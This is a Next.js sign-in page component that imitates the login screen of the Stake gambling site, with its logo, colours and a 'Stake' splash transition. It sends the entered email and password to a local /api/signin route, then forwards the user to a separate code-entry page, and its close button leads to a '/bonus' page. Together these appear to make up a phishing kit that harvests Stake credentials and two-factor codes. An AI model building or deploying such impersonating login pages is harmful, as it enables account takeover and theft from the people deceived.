"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { X, Eye, EyeOff, Key } from "lucide-react";
import { useRouter } from "next/navigation";
import StakeTransition from "../component/StakeTransition";

export default function SignInPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showTransition, setShowTransition] = useState(true);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const router = useRouter();

  // Stake transition timeout
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowTransition(false);
    }, 4000);

    return () => clearTimeout(timer);
  }, []);

  // 🔑 SIGN IN HANDLER
  const handleSignIn = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const res = await fetch("/api/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.message || "Something went wrong");
        setLoading(false);
        return;
      }

      // ✅ SUCCESS → route to code page
      router.push("/signin/code");
    } catch (err) {
      setError("Unable to connect to server");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      {/* FULL PAGE STAKE TRANSITION */}
      {showTransition && <StakeTransition />}

      <div className="min-h-screen bg-[#1D2C37] flex items-center justify-center p-6">
        <div className="bg-[#1D2C37] rounded-lg w-full max-w-md p-8 relative shadow-lg">
          {/* Close Button */}
          <Link
            href="/bonus"
            className="absolute top-6 right-6 text-white hover:text-gray-400 transition-colors"
          >
            <X size={24} />
          </Link>

          {/* Logo */}
          <div className="stake-logo text-white text-2xl mb-8">Stake</div>

          {/* Email Field */}
          <div className="mb-4">
            <label className="block text-[#A0A3A7] text-sm mb-2">
              Email or Username <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-[#1D2C37] border-2 border-[#4A4D51] rounded-[6px] px-4 py-3 text-white focus:outline-none focus:border-blue-500"
            />
          </div>

          {/* Password Field */}
          <div className="mb-4">
            <label className="block text-[#A0A3A7] text-sm mb-2">
              Password <span className="text-red-500">*</span>
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full bg-[#1D2C37] border-2 border-[#4A4D51] rounded-[6px] px-4 py-3 pr-10 text-white focus:outline-none focus:border-blue-500"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#A0A3A7]"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          {/* ERROR MESSAGE */}
          {error && (
            <div className="mb-4 text-sm text-red-500 bg-red-500/10 p-3 rounded">
              {error}
            </div>
          )}

          {/* Sign In Button */}
          <button
            onClick={handleSignIn}
            disabled={loading}
            className="w-full bg-[#3366FF] hover:bg-[#2856E6] disabled:opacity-60 text-white font-semibold py-3 rounded-[6px] transition-colors mb-6"
          >
            {loading ? "Signing In..." : "Sign In"}
          </button>

          {/* Rest of UI unchanged */}
        </div>
      </div>
    </>
  );
}
